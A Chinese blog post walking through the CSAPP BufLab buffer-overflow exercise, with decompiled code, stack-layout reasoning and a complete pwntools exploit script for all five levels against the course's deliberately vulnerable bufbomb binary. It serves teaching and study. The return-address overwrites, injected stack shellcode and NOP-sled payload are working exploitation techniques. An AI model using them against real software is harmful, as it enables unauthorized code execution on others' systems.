---
title: 'CSAPP: buflab以及从其中得到的启示'
date: 2023-03-14 13:52:19
tags:
  - CSAPP
categories:
  - CSAPP
  - pwn
keywords: buffer_overflow, gdb
description: '鸽了接近一年的buflab在今天迎来终结之时'
---
## 写在开头
翻开自己在简书上写的AttackLab的时间，还是2022年3月8日，碰巧距离第一篇博客的时间刚好一年，那时候在windows上用WSL完成了DataLab和BombLab，而在WSL环境下调试32位的程序存在种种问题，尝试了许多办法未奏效，彼时我手里刚买了一台轻薄本，于是用了一两天的时间把系统换成了ArchLinux完成了AttackLab。时过境迁，那台ArchLinux轻薄本如今我已经很少去使用了。不禁感慨到相比于一年之前，我还是对很多trick和知识一无所知。有很多想学想做的东西在漫宿的时间中被不断遗忘，一年里各种意义上的沧海桑田。多年以后回望2022，难以想见我的脸上会出现什么样的神情。
## CSAPP-BufLab
AttackLab中我用了pwntools来写writeup，这一次我依然选择pwntools，原因是更容易理解writeup具体的思路。有点太过自然的先checksec一下：
```shell
zyd@Dori:~/projects/CSAPP/buflab$ checksec ./bufbomb 
[*] '/home/zyd/projects/CSAPP/buflab/bufbomb'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
    FORTIFY:  Enabled
```
然后阅读BufLab的Manual可知只有level4需要开Nitro模式，且在Nitro模式下会读取5次输入，每一次的栈顶地址都会发生变化，当然下文会提到更详细的Nitro实现细节，先切入正题。
### level0
level0就是最基本的栈溢出，而且smoke函数会直接调用exit退出，在32位程序中不需要考虑64位程序令人烦扰的stack align问题，所以只需要覆盖到返回地址即可：
```python3
def level0(self) -> None:
    self._init_prog(self.id)
    payload = cyclic(0x2C) + p32(self.exe.sy["smoke"])
    self.prog.sendline(payload)
    self.prog.interactive()
```
### level1
level1要求调用fizz函数后将fizz函数的第一个整型参数val改为cookie，熟悉32位程序栈溢出的话会对栈布局有一个很清楚的认知，大致为ebp -> return-address -> caller-return-address -> variable1 -> variable2 ...这里就不再赘述，对于初次接触32位程序栈溢出的人会困惑，我会建议参考者自行搜索x86调用约定和32位程序下的栈溢出。
```python3
def level1(self) -> None:
    self._init_prog(self.id)
    payload = cyclic(0x2C) + p32(self.exe.sym["fizz"]) + cyclic(4) + p32(self.cookie)
    self.prog.sendline(payload)
    self.prog.interactive()
```
### level2
level2和level1的要求类似，只是要求改写的是一个全部变量。在gdb调试的过程使用vmmap命令查看内存布局，会发现当前运行下的栈的读写权限为rwx，即栈上的数据可以作为指令来执行，那么思路就很明确了，在输入的payload中写入需要执行的指令，然后令返回地址为payload在内存中开始的地址即可。

重点来了，可以通过gdb直接在调试过程中得到输入payload的准确地址吗？这需要去分析bufbomb的栈构造方式，先从main函数中说起：
```C
do {
    i = getopt(param_1,param_2,"gsnhu:");
    if ((char)i == -1) {
      if (userid == 0) {
        __printf_chk(1,"%s: Missing required argument (-u <userid)\n",*param_2);
        usage();
      }
      initialize_bomb();
      __printf_chk(1,"Userid: %s\n",userid);
      __printf_chk(1,"Cookie: 0x%x\n",cookie);
      srandom(cookie);
      uVar1 = random();
      puVar2 = (undefined4 *)calloc(__nmemb,4);
      *puVar2 = 0;
      for (i = 1; i < (int)__nmemb; i = i + 1) {
        uVar3 = random();
        puVar2[i] = 0x80 - (uVar3 & 0xf0);
      }
      for (i = 0; i < (int)__nmemb; i = i + 1) {
        launcher(nitro,(uVar1 & 0xff0) + 0x100 + puVar2[i]);
      }
      return 0;
    }
    switch(i - 0x67U & 0xff) {
    case 0:
      autograde = 1;
      break;
    case 1:
      usage();
    case 0xe:
      userid = __strdup(optarg);
      cookie = gencookie(userid);
      break;
    default:
      usage();
      break;
    case 7:
      nitro = 1;
      __nmemb = 5;
      break;
    case 0xc:
      puts("This is a quiet bomb. Ignoring -s flag.");
      notify = 0;
    }
  } while( true );
```
以上是由ghidra生成反汇编C代码，在非Nitro模式中，__nmemb为1，且launcher的第二个参数在cookie固定的情况下应当也是固定的，这是因为srandom使用的cookie由id生成，而这一函数gencookie是确定的。launcher函数的第二个参数非常重要，继续追溯下去会发现在launcher函数第二个参数将被赋值给全局变量global_offset，直至launch函数中global_offset被赋值给寄存器edx并且在launch函数中有如下指令：
```x86assembly
08048ebf 8d 44 11 1e     LEA        EAX,[ECX + EDX*0x1 + 0x1e]
08048ec3 83 e0 f0        AND        EAX,0xfffffff0
08048ec6 29 c4           SUB        ESP,EAX
```
而在launcher函数中，改变栈顶位置的关键指令为：
```x86assembly
 8048fc8:	ba f8 5f 68 55       	mov    edx,0x55685ff8
 8048fcd:	89 e0                	mov    eax,esp
 8048fcf:	89 d4                	mov    esp,edx
 8048fd1:	89 c2                	mov    edx,eax
```

故launcher函数的第二个参数决定了最终输入payload时栈的地址以及布局，在非Nitro模式下puVar2的值固定为0,这似乎所有的事情都指向一个事实：只要在运行时拿到栈顶地址，栈的布局就完全确定了，即使重新启动程序id不发生变化，那么输入payload后栈上的布局也不会变化。

这句话确实正确的无可挑剔，所以用gdb调试拿到运行时esp，ebp等寄存器的值然后将其用于最终payload的值是一件看似很正确的事情。这样做的思路忽略了一个问题：用gdb启动程序与直接在shell中启动程序的堆栈布局是相同的吗？很可惜，答案是否定的。CSAPP的manual中就有解释：
>From one run to another, especially by different users, the exact stack positions used by a given procedure
will vary. One reason for this variation is that the values of all environment variables are placed near the
base of the stack when a program starts executing. Environment variables are stored as strings, requiring
different amounts of storage depending on their values. Thus, the stack space allocated for a given user
depends on the settings of his or her environment variables. Stack positions also differ when running a
program under GDB, since GDB uses stack space for some of its own state.

在调试过程中，如果注意观察栈最底部的位置，会看到许多表示环境变量的字符串，使用gdb的话，一定会看到这样一行：
>_=/usr/bin/gdb

而在shell中运行是没有的。但很遗憾的是这一问题对于bufbomb来说并没有影响，直接使用调试时的栈布局的寄存器值作为payload的一部分是大部分writeup的做法，初始化栈顶位置固定（0x55685ff8），而偏移后栈的位置完全由id生成的cookie指定，不同平台下只要id相同，栈的布局也是一致的。而对于大部分CTF pwn challenge，栈的位置需要在exp的过程中泄漏出来以完成对栈上数据的利用。

完整的exp会在最后放出：
```python3
def level2(self) -> None:
    self._init_prog(self.id)
    code = """
    mov eax, {cookie}
    mov ebx, {global_value}
    mov [ebx], eax
    mov ecx, {bang} 
    call ecx
    """.format(
        cookie=hex(self.cookie),
        global_value=hex(self.exe.sym["global_value"]),
        bang=hex(self.exe.sym["bang"]),
        )
    payload = asm(code).ljust(0x2C, b"\x00") + p32(0x55683618)
    # code + junk + code_address
    self.prog.sendline(payload)
    self.prog.interactive()
```
### level3
level3需要返回到test函数中并且不破坏test函数运行时的栈布局，其实也就是不能污染return-address之后的数据并且保留原本的ebp指向位置的值，原因是getbuf函数末尾的指令：
```x86assembly
leave
ret
```
leave指令等价于指令`mov esp, ebp; pop ebp`，ebp的作用就是在被调用函数中记录调用函数的栈位置，覆盖ebp指向的值也是非常实用的栈溢出技巧，这里不再细述。
与level2类似，只需要保留ebp指向的值即可，当然ebp指向的值也由id确定：
```python3
def level3(self) -> None:
    self._init_prog(self.id)
    code = """
    mov eax, {cookie}
    push {getbuf_ret}
    ret
    """.format(
        cookie=hex(self.cookie),
        getbuf_ret=hex(self.exe.sym["test"] + 20),
    )
    payload = asm(code).ljust(0x28, b"\x00") + p32(0x55683670) + p32(0x55683618)
    # code + junk + *ebp + code_address
    self.prog.sendline(payload)
    self.prog.interactive()
```
### level4
level4在Nitro模式下运行，由之前的反汇编C代码可知栈顶的位置在每一次运行时都发生了改变，ebp值也会随之改变，似乎原本的方法不再奏效。但随机数的种子依然固定，用于随机化栈的指令是可以预测的，所以延续level3的做法，将每个随机数求出就可以写出5次输入对应的payload。

那有没有办法不去求每一次输入时对应的ebp值？有，我看到了一个很巧妙的办法，也意识到了这其实是和很多栈溢出题目相似的思路。那就是：**栈的绝对地址是不能确定的，而栈上数据的相对地址往往是固定的**。在同一环境下，“往往”就可以拿掉了，事实上需要用到栈上数据相对偏移的以确定数据位置时，决定偏移量的就是实际的运行环境，包括libc版本，操作系统环境等一系列的因素，这一类型的pwn challenge经常会遇到本地偏移量与远程不一致的情况，这种时候只能去做偏移量的fuzz。有了这一经验思路，那么得到原本ebp指向数值的方法就呼之欲出了：**利用ebp指向数值与esp的偏移量**。而对于bufbomb而言，栈布局是完全确定的，我甚至可以断言，即使使用不同的id，这个偏移量一定为0x28。至于为什么，因为level3、level4中的溢出目的只是改变返回值即寄存器eax的值，对于testn函数而言除了eax的变化是感受不到getbufn函数中存在溢出的，而影响ebp指向数值与esp相对偏移的变量，只有在调用过程中所有指令对程序栈的改变，现在说明了getbufn函数中的天翻地覆对testn函数并无影响，且栈溢出后也没有改变esp的值，那么这一只取决于指令对栈状态改变的偏移量也一定不会变化。这类似于一种从有限状态机角度思考的解释，我的表达能力欠佳，读者可能会有一些误解。
将整个程序在这里放出：
```python3
from pwn import *

context.log_level = "debug"


class buflab:
    def __init__(self, id: str = "zeredy") -> None:
        self.exe = ELF("./bufbomb")
        self.id = id

    def _init_prog(self, id: str, mode: str = None) -> None:
        if mode == "nitro":
            self.prog = self.exe.process(["-nu", id])
        else:
            self.prog = self.exe.process(["-u", id])
        self.prog.recvuntil(b"Cookie: ")
        self.cookie = int(self.prog.recvline().strip().decode(), 16)
        # self.debug()

    def debug(self) -> None:
        gdb.attach(self.prog)

    def level0(self) -> None:
        self._init_prog(self.id)
        payload = cyclic(0x2C) + p32(self.exe.sym["smoke"])
        self.prog.sendline(payload)
        self.prog.interactive()

    def level1(self) -> None:
        self._init_prog(self.id)
        payload = (
            cyclic(0x2C) + p32(self.exe.sym["fizz"]) + cyclic(4) + p32(self.cookie)
        )
        self.prog.sendline(payload)
        self.prog.interactive()

    def level2(self) -> None:
        self._init_prog(self.id)
        code = """
        mov eax, {cookie}
        mov ebx, {global_value}
        mov [ebx], eax
        mov ecx, {bang} 
        call ecx
        """.format(
            cookie=hex(self.cookie),
            global_value=hex(self.exe.sym["global_value"]),
            bang=hex(self.exe.sym["bang"]),
        )
        payload = asm(code).ljust(0x2C, b"\x00") + p32(0x55683618)
        self.prog.sendline(payload)
        self.prog.interactive()

    def level3(self) -> None:
        self._init_prog(self.id)
        code = """
        mov eax, {cookie}
        push {getbuf_ret}
        ret
        """.format(
            cookie=hex(self.cookie),
            getbuf_ret=hex(self.exe.sym["test"] + 20),
        )
        payload = asm(code).ljust(0x28, b"\x00") + p32(0x55683670) + p32(0x55683618)
        self.prog.sendline(payload)
        self.prog.interactive()

    def level4(self) -> None:
        self._init_prog(self.id, "nitro")
        code = """
        mov eax, {cookie}
        lea ebp, [esp + 0x28]
        push {getbuf_ret}
        ret
        """.format(
            cookie=hex(self.cookie),
            getbuf_ret=hex(self.exe.sym["testn"] + 20),
        )
        payload = asm(code).rjust(0x208, b"\x90") + p32(0x55683670) + p32(0x55683448)
        for _ in range(5):
            self.prog.sendline(payload)
            self.prog.recv()
        self.prog.interactive()
```
